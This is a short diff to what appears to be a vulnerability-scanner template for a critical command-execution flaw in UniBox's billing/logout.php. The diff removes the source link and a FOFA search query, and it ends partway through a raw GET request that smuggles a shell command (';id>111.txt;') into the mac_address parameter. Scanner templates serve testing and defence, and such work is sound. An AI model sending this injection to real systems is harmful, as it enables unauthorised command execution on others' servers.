@@ -3,12 +3,8 @@ info:
   name: unibox logout.php存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gau0v3h8qf66zv3s'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gau0v3h8qf66zv3s
-    fofa: body="UniBox"
 http:
 - raw:
   - 'GET /billing/logout.php?logout_user=1&mac_address=;id>111.txt; HTTP/1.1
